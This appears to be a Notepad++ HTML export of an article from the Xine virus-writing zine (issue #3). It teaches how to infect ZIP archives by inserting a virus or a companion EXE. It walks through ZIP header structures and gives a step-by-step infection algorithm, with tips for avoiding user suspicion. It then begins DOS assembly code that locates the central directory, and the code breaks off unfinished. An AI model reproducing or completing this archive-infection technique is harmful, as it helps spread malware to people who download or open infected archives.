<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                         /-----------------------------\
;                                         | Xine - issue #3 - Phile 108 |</span><span class="sc0">
</span><span class="sc1">;                                         \-----------------------------/</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                   DROPPING &amp; COMPANIONING over ZIP archives</span><span class="sc0">
</span><span class="sc1">;                       From the Archives infector series</span><span class="sc0">
</span><span class="sc1">;                           by UnknowN MnemoniK/ikx</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Intro</span><span class="sc0">
</span><span class="sc1">;  +-----+</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Zip are the most complex archive file to infect , obviously also the most</span><span class="sc0">
</span><span class="sc1">;  used , a lot of programs use them , create them , modify them , make some</span><span class="sc0">
</span><span class="sc1">;  phucked  tricks on them , those programs are  almost writted in C by  bad</span><span class="sc0">
</span><span class="sc1">;  coders using library, object and code and don't care about the structure.</span><span class="sc0">
</span><span class="sc1">;  I have found only one prog that use a little assembler , but like all asm</span><span class="sc0">
</span><span class="sc1">;  code writted by a c programmer , the code is unreadable , really , I have</span><span class="sc0">
</span><span class="sc1">;  spend  three  hours about shitty  things,the code  might to be  something</span><span class="sc0">
</span><span class="sc1">;  coded  by Jacky Qwerty ,  unreadable , uncomprehensible  and without  any</span><span class="sc0">
</span><span class="sc1">;  sense  but  it  works . Infect a zip is an art because a lot of platforms</span><span class="sc0">
</span><span class="sc1">;  support them  and specially BBS that convert ALL files they receive  into</span><span class="sc0">
</span><span class="sc1">;  zip files (with any kinda archiver) , zip are also  really common  on ftp</span><span class="sc0">
</span><span class="sc1">;  but also on cdrom , waraz games , etc etc etc....</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   The zip file format</span><span class="sc0">
</span><span class="sc1">;  +-------------------+</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Zip doesn't use the same scheme of packet like another archive, it uses a</span><span class="sc0">
</span><span class="sc1">;  &lt;&lt;locked&gt;&gt; and a little messy structure , for this reason there are a lot</span><span class="sc0">
</span><span class="sc1">;  of infection ways ( Gewd for vx ), in fact, you have three types of areas</span><span class="sc0">
</span><span class="sc1">;  of  packets  , the local files , the  central  directory  and the end  of </span><span class="sc0">
</span><span class="sc1">;  central directory, the first contain a certain header plus the compressed</span><span class="sc0">
</span><span class="sc1">;  file  ,  the second contains severals informations ( and usefull for us )</span><span class="sc0">
</span><span class="sc1">;  and of course have  his  header , the  third and  the last  one  contains </span><span class="sc0">
</span><span class="sc1">;  general informations about the file , here's the scheme</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  +-------------------+</span><span class="sc0">
</span><span class="sc1">;  | Local File 1      | ----------+</span><span class="sc0">
</span><span class="sc1">;  +-------------------+           |      The information about  the file in</span><span class="sc0">
</span><span class="sc1">;  | Local File 2      |           |      local file 1  must  be the same as</span><span class="sc0">
</span><span class="sc1">;  +-------------------+           |      Central Directory 1 to have a full</span><span class="sc0">
</span><span class="sc1">;  | Local File ...    |           +----- compatibility with any zip program</span><span class="sc0">
</span><span class="sc1">;  +-------------------+           |      The first block of  Central Dir. 1</span><span class="sc0">
</span><span class="sc1">;  | Local File n      |           |      need to be in relation  with Local </span><span class="sc0">
</span><span class="sc1">;  +-------------------^---+       |      File 1 , the second Central Dir. 2</span><span class="sc0">
</span><span class="sc1">;  | Central Directory 1   | ------+      with the Local File 2 ,  you  MUST </span><span class="sc0">
</span><span class="sc1">;  +-----------------------+              respect   this  order  .  In  fact </span><span class="sc0">
</span><span class="sc1">;  | Central Directory 2   |              PKUNZIP don't care about the order</span><span class="sc0">
</span><span class="sc1">;  +-----------------------+              but  some  programs  like   Norton</span><span class="sc0">
</span><span class="sc1">;  | Central Directory ... |              commander archive utility report a</span><span class="sc0">
</span><span class="sc1">;  +-----------------------+              a crash  if you  don't respect  it </span><span class="sc0">
</span><span class="sc1">;  | Central Directory n   |              anyway , crashes alert  often  the</span><span class="sc0">
</span><span class="sc1">;  +-----------------------^--+           user  who believe  that  he have a  </span><span class="sc0">
</span><span class="sc1">;  | End of central directory |           virus (really pathetic ...)</span><span class="sc0">
</span><span class="sc1">;  +--------------------------+</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  It's  important  to see  how it works for any  manipulation</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;   Headers structure</span><span class="sc0">
</span><span class="sc1">;  +-----------------+</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  I  need  to send  a big  thanks to  Griyo  and superx  who  sent me those</span><span class="sc0">
</span><span class="sc1">;  informations  that helped me  a lot for the zip infection!  I found  this</span><span class="sc0">
</span><span class="sc1">;  really easy  to understand , I had  tried  to do the same things for  the</span><span class="sc0">
</span><span class="sc1">;  arj and rar</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">; OFFSET LABEL       TYP  VALUE        DESCRIPTION</span><span class="sc0">
</span><span class="sc1">; ------ ----------- ---- ----------- ----------------------------------</span><span class="sc0">
</span><span class="sc1">; 00     ZIPLOCSIG   HEX  04034B50    ;Local File Header Signature</span><span class="sc0">
</span><span class="sc1">; 04     ZIPVER      DW   0000        ;Version needed to extract</span><span class="sc0">
</span><span class="sc1">; 06     ZIPGENFLG   DW   0000        ;General purpose bit flag</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Value : (Bit) 0 = File encrypted    </span><span class="sc0">
</span><span class="sc1">;             1 = If set and file imploded , then 8k sliding </span><span class="sc0">
</span><span class="sc1">;             dictionary was used , else 4k dictionary was used</span><span class="sc0">
</span><span class="sc1">;             2 = If set and file imploded , then 3 shannon-Fano</span><span class="sc0">
</span><span class="sc1">;             trees were used , else 2 shannon-Fano trees</span><span class="sc0">
</span><span class="sc1">;             3-4 = unused</span><span class="sc0">
</span><span class="sc1">;             5-7 = used internaly by zip   </span><span class="sc0">
</span><span class="sc1">;            </span><span class="sc0">
</span><span class="sc1">; 08     ZIPMTHD     DW   0000        ;Compression method</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Value : 0 = No compression used</span><span class="sc0">
</span><span class="sc1">;       1 = LZW , 8K buffer , 9-13 buts with partial clearing</span><span class="sc0">
</span><span class="sc1">;       2 = Reduced-1 , Probalistic compression L(X)=lower 7 bits   </span><span class="sc0">
</span><span class="sc1">;       3 = Reduced-2 , idem but lower 6 bits</span><span class="sc0">
</span><span class="sc1">;       4 = Reduced-3 , idem + lower 5 bits</span><span class="sc0">
</span><span class="sc1">;       5 = Reduced-4 , idem + lower 4 bits</span><span class="sc0">
</span><span class="sc1">;       6 = Imploded , 2 Shanno-Fanno trees ,4K sliding dictionary</span><span class="sc0">
</span><span class="sc1">;       7 = Imploded , 3 Shanno-Fanno trees ,4K sliding dictionary</span><span class="sc0">
</span><span class="sc1">;       8 = Imploded , 2 Shanno-Fanno trees ,8K sliding dictionary</span><span class="sc0">
</span><span class="sc1">;       9 = Imploded , 3 Shanno-Fanno trees ,8K sliding dictionary</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 0A     ZIPTIME     DW   0000        ;Last mod file time (MS-DOS)</span><span class="sc0">
</span><span class="sc1">; 0C     ZIPDATE     DW   0000        ;Last mod file date (MS-DOS)</span><span class="sc0">
</span><span class="sc1">; 0E     ZIPCRC      HEX  00000000    ;CRC-32</span><span class="sc0">
</span><span class="sc1">; 12     ZIPSIZE     HEX  00000000    ;Compressed size</span><span class="sc0">
</span><span class="sc1">; 16     ZIPUNCMP    HEX  00000000    ;Uncompressed size</span><span class="sc0">
</span><span class="sc1">; 1A     ZIPFNLN     DW   0000        ;Filename length</span><span class="sc0">
</span><span class="sc1">; 1C     ZIPXTRALN   DW   0000        ;Extra field length</span><span class="sc0">
</span><span class="sc1">; 1E     ZIPNAME     DS   ZIPFNLN     ;filename</span><span class="sc0">
</span><span class="sc1">; --     ZIPXTRA     DS   ZIPXTRALN   ;extra field</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; CENTRAL DIRECTORY STRUCTURE</span><span class="sc0">
</span><span class="sc1">; ---------------------------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; OFFSET LABEL       TYP  VALUE        DESCRIPTION</span><span class="sc0">
</span><span class="sc1">; ------ ----------- ---- ----------- ----------------------------------</span><span class="sc0">
</span><span class="sc1">; 00     ZIPCENSIG   HEX  02014B50    ;Central file header signature</span><span class="sc0">
</span><span class="sc1">; 04     ZIPCVER     DB   00          ;Version made by</span><span class="sc0">
</span><span class="sc1">; 05     ZIPCOS      DB   00          ;Host operating system</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   value : 0 = MS-DOS and OS/2 1 = Amiga</span><span class="sc0">
</span><span class="sc1">;       2 = VMS         3 = *nix</span><span class="sc0">
</span><span class="sc1">;       4 = VM/CMS      5 = Atari ST</span><span class="sc0">
</span><span class="sc1">;       6 = OS/2 1.2        7 = Macintosh</span><span class="sc0">
</span><span class="sc1">;       8 = thru        </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 06     ZIPCVXT     DB   00          ;Version needed to extract</span><span class="sc0">
</span><span class="sc1">; 07     ZIPCEXOS    DB   00          ;O/S of version needed for extraction</span><span class="sc0">
</span><span class="sc1">; 08     ZIPCFLG     DW   0000        ;General purpose bit flag</span><span class="sc0">
</span><span class="sc1">; 0A     ZIPCMTHD    DW   0000        ;Compression method</span><span class="sc0">
</span><span class="sc1">; 0C     ZIPCTIM     DW   0000        ;Last mod file time (MS-DOS)</span><span class="sc0">
</span><span class="sc1">; 0E     ZIPCDAT     DW   0000        ;Last mod file date (MS-DOS)</span><span class="sc0">
</span><span class="sc1">; 10     ZIPCCRC     HEX  00000000    ;CRC-32</span><span class="sc0">
</span><span class="sc1">; 14     ZIPCSIZ     HEX  00000000    ;Compressed size</span><span class="sc0">
</span><span class="sc1">; 18     ZIPCUNC     HEX  00000000    ;Uncompressed size</span><span class="sc0">
</span><span class="sc1">; 1C     ZIPCFNL     DW   0000        ;Filename length</span><span class="sc0">
</span><span class="sc1">; 1E     ZIPCXTL     DW   0000        ;Extra field length</span><span class="sc0">
</span><span class="sc1">; 20     ZIPCCML     DW   0000        ;File comment length</span><span class="sc0">
</span><span class="sc1">; 22     ZIPDSK      DW   0000        ;Disk number start</span><span class="sc0">
</span><span class="sc1">; 24     ZIPINT      DW   0000        ;Internal file attributes</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   value : (Bit) 0 = if set then file is an ascii text file</span><span class="sc0">
</span><span class="sc1">;             else , file apparently contains binary data</span><span class="sc0">
</span><span class="sc1">;             1-7 = unused  </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 26     ZIPEXT      HEX  00000000    ;External file attributes, host</span><span class="sc0">
</span><span class="sc1">;                                     ;system dependent</span><span class="sc0">
</span><span class="sc1">; 2A     ZIPOFST     HEX  00000000    ;Relative offset of local header</span><span class="sc0">
</span><span class="sc1">;                                     ;from the start of the first disk</span><span class="sc0">
</span><span class="sc1">;                                     ;on which this file appears</span><span class="sc0">
</span><span class="sc1">; 2E     ZIPCFN      DS   ZIPCFNL     ;Filename or path - should not</span><span class="sc0">
</span><span class="sc1">;                                     ;contain a drive or device letter,</span><span class="sc0">
</span><span class="sc1">;                                     ;or a leading slash. All slashes</span><span class="sc0">
</span><span class="sc1">;                                     ;should be forward slashes '/'</span><span class="sc0">
</span><span class="sc1">; --     ZIPCXTR     DS   ZIPCXTL     ;extra field</span><span class="sc0">
</span><span class="sc1">; --     ZIPCOM      DS   ZIPCCML     ;file comment</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; END OF CENTRAL DIR STRUCTURE</span><span class="sc0">
</span><span class="sc1">; ----------------------------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; OFFSET LABEL       TYP  VALUE        DESCRIPTION</span><span class="sc0">
</span><span class="sc1">; ------ ----------- ---- ----------- ----------------------------------</span><span class="sc0">
</span><span class="sc1">; 00     ZIPESIG     HEX  06064B50    ;End of central dir signature</span><span class="sc0">
</span><span class="sc1">; 04     ZIPEDSK     DW   0000        ;Number of this disk</span><span class="sc0">
</span><span class="sc1">; 06     ZIPECEN     DW   0000        ;Number of disk with start central dir</span><span class="sc0">
</span><span class="sc1">; 08     ZIPENUM     DW   0000       ;Total number of entries in central dir</span><span class="sc0">
</span><span class="sc1">;                                     ;on this disk</span><span class="sc0">
</span><span class="sc1">; 0A     ZIPECENN    DW   0000        ;total number entries in central dir</span><span class="sc0">
</span><span class="sc1">; 0C     ZIPECSZ     HEX  00000000    ;Size of the central directory</span><span class="sc0">
</span><span class="sc1">; 10     ZIPEOFST    HEX  00000000    ;Offset of start of central directory</span><span class="sc0">
</span><span class="sc1">;                                     ;with respect to the starting disk</span><span class="sc0">
</span><span class="sc1">;                                     ;number</span><span class="sc0">
</span><span class="sc1">; 14     ZIPECOML    DW   0000        ;zipfile comment length</span><span class="sc0">
</span><span class="sc1">; 16     ZIPECOM     DS   ZIPECOML    ;zipfile comment</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Note that ZIPECOM will be displayed at screen !</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  those  datas  becomes from a document  writted  by Raymond  Clay , read it</span><span class="sc0">
</span><span class="sc1">;  many times , when you have already well understand it , we can pass on the</span><span class="sc0">
</span><span class="sc1">;  infection process</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Infection</span><span class="sc0">
</span><span class="sc1">;  +---------+</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Of course ,for any infection , you must fix host os and compression to No </span><span class="sc0">
</span><span class="sc1">;  compression , when done then we can continue infection</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Okay ,  if you want infect  any zip file , you will have 3 tricks to do ,</span><span class="sc0">
</span><span class="sc1">;  first drop  the local  header  and the virus , second  drop  the  central</span><span class="sc0">
</span><span class="sc1">;  directory about the virus go to the end and modify the end of central dir</span><span class="sc0">
</span><span class="sc1">;  structure and close the file</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  In fact , the situation is not too simple, there are many problems, first</span><span class="sc0">
</span><span class="sc1">;  you must drop the virus as the last packet in the local file packets area</span><span class="sc0">
</span><span class="sc1">;  Why not set it as  the first packet ? because the zipofst of other packet</span><span class="sc0">
</span><span class="sc1">;  will not correspond with the reality, after that you need also to put the</span><span class="sc0">
</span><span class="sc1">;  central directory packet at the end of the file, and you must also modify</span><span class="sc0">
</span><span class="sc1">;  the end of central directory packet.Okay but anyway if you write the last</span><span class="sc0">
</span><span class="sc1">;  local , you overwrite the central, so you must save the central directory</span><span class="sc0">
</span><span class="sc1">;  area, if you  overwrite the central directory you will overwrite also the</span><span class="sc0">
</span><span class="sc1">;  end of central header ,so you must save it also</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  The second big problem is to find the end of the local packets area ,good</span><span class="sc0">
</span><span class="sc1">;  news, this is also the begin of central directory area,I know two methods</span><span class="sc0">
</span><span class="sc1">;  to find the start of central directory</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      * The  offset of the start of  central directory is placed in the END </span><span class="sc0">
</span><span class="sc1">;        OF CENTRAL , the END OF CENTRAL  is at the end of the file , so you </span><span class="sc0">
</span><span class="sc1">;        can get  it only  with the end of central ,  unfortunately  there's </span><span class="sc0">
</span><span class="sc1">;        the comment and extra string, so you need to search where start the </span><span class="sc0">
</span><span class="sc1">;        END OF CENTRAL , and then get the start of CENTRAL DIRECTORY</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      * The seeking  method consist  to jump from an header to an another ,</span><span class="sc0">
</span><span class="sc1">;        you read the first header,  calculate the offset of the next header</span><span class="sc0">
</span><span class="sc1">;        until you  find the CENTRAL DIRECTORY signature, this method is the</span><span class="sc0">
</span><span class="sc1">;        most secure way to find the central directory</span><span class="sc0">
</span><span class="sc1">;        </span><span class="sc0">
</span><span class="sc1">;  I have choosed the first solution I found the second one require too many</span><span class="sc0">
</span><span class="sc1">;  disk acesses and it will raise user's suspects ,with the first solution ,</span><span class="sc0">
</span><span class="sc1">;  I can't read any byte I want from the end of the file,so I have choose to</span><span class="sc0">
</span><span class="sc1">;  read only  5000 bytes from the end ( think that 80x25 = 2000 ), I haven't</span><span class="sc0">
</span><span class="sc1">;  encountered  zips that have an end of central bigger than 5000, it's okay</span><span class="sc0">
</span><span class="sc1">;  and it's works right!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  When I have located  the offset of the local header ,I read it and put it</span><span class="sc0">
</span><span class="sc1">;  into a buffer , after that , I get the offset of the start of the central</span><span class="sc0">
</span><span class="sc1">;  directory , I save the central directory area plus the location , I write </span><span class="sc0">
</span><span class="sc1">;  the virus and a new header , I write all the central directory  , the new</span><span class="sc0">
</span><span class="sc1">;  central directory and the modified end of central directory</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Companing ? Yeah, this is possible because we can found the original name</span><span class="sc0">
</span><span class="sc1">;  in the central directory  , when an EXE file is found  , then we copy the</span><span class="sc0">
</span><span class="sc1">;  name into a buffer and write it  into the central directory and the local</span><span class="sc0">
</span><span class="sc1">;  header. For that operation you need to scan each header , if no exe found</span><span class="sc0">
</span><span class="sc1">;  you can also drop a file into the zip but this is more dangerous</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  We can build the  zip infection algorithm  , it's mine , there's a lot of</span><span class="sc0">
</span><span class="sc1">;  other , that can be quite good</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  1ø Open the file </span><span class="sc0">
</span><span class="sc1">;  2ø Go to the end - 5000</span><span class="sc0">
</span><span class="sc1">;  3ø Read 5000 bytes</span><span class="sc0">
</span><span class="sc1">;  4ø Scan after the end of central directory , if not found goto 13</span><span class="sc0">
</span><span class="sc1">;  5ø Save the end central directory</span><span class="sc0">
</span><span class="sc1">;  6ø get start offset of central directory and save it also </span><span class="sc0">
</span><span class="sc1">;  7ø goto to start of offset of central directory </span><span class="sc0">
</span><span class="sc1">;  8ø Write the header of the virus plus the virus</span><span class="sc0">
</span><span class="sc1">;  9ø Write central directory</span><span class="sc0">
</span><span class="sc1">;  10ø Write central directory viral header</span><span class="sc0">
</span><span class="sc1">;  11ø Modify end of central directory</span><span class="sc0">
</span><span class="sc1">;  12ø Write end of central directory</span><span class="sc0">
</span><span class="sc1">;  13ø Close the file</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Zip open ways to a lot of infection types , sure, you'll surprised in the</span><span class="sc0">
</span><span class="sc1">;  next issue of  Xine  to see how zip can be used by VX to do something you </span><span class="sc0">
</span><span class="sc1">;  would never imagine</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Anyway , I invite you to see the code below , compile this code with TASM</span><span class="sc0">
</span><span class="sc1">;  &amp; TLINK and test it with a TEST.ZIP file in the directory , test with and</span><span class="sc0">
</span><span class="sc1">;  without an executable in the file</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc2">.286</span><span class="sc0">                                            
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                                    </span><span class="sc1">; open in r/w</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zipfile</span><span class="sc0">                           </span><span class="sc1">; zipfile</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                         </span><span class="sc1">; ask dos , dos do it!</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                                      </span><span class="sc1">; bx = handle</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                                      </span><span class="sc1">; go at the end</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">go</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sizeoffile</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; save position ( for use</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sizeoffile</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">                    </span><span class="sc1">; later )</span><span class="sc0">

</span><span class="sc5">search_startoflocal</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">5000</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                                    </span><span class="sc1">; go at endoffile-5000</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; ask dos , dos do it !</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                  </span><span class="sc1">; go read anything</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5000</span><span class="sc0">                 </span><span class="sc1">; go now</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temporary1</span><span class="sc0">            </span><span class="sc1">; put it into temporary1</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; read it</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temporary1</span><span class="sc0">            </span><span class="sc1">; si = temporary1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5000</span><span class="sc0">

</span><span class="sc5">O_loop</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">                            </span><span class="sc1">; scan after PK signature</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b50h</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">testifPK</span><span class="sc0">
                                            </span><span class="sc1">;test about word for endofcentral</span><span class="sc0">
                                            </span><span class="sc1">;signature</span><span class="sc0">
</span><span class="sc5">O_Next1</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">O_loop</span><span class="sc0">

</span><span class="sc5">kern_error</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">novalid_or_badzip</span><span class="sc0">                       </span><span class="sc1">; not found ? erm don't infect it</span><span class="sc0">

</span><span class="sc5">testifPK</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0605h</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">O_next1</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                                         </span><span class="sc1">; save local position</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">                                         </span><span class="sc1">; and bp  </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">5000</span><span class="sc0">                                     </span><span class="sc1">; si = start of end + offset </span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temporary1</span><span class="sc0">                        </span><span class="sc1">; temporary1 </span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                                       </span><span class="sc1">; bp = 5000 - (temporary1-si)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sizeofend</span><span class="sc4">],</span><span class="sc8">bp</span><span class="sc0">                     </span><span class="sc1">; here we get the size of</span><span class="sc0">
                                                </span><span class="sc1">; sizeofend</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">                                          </span><span class="sc1">; restore bp</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                                          </span><span class="sc1">; restore si</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">; save the size of central</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sizeofcentral</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">kern_error</span><span class="sc0">                                  </span><span class="sc1">; if sizeofcentral &gt; 64 k</span><span class="sc0">
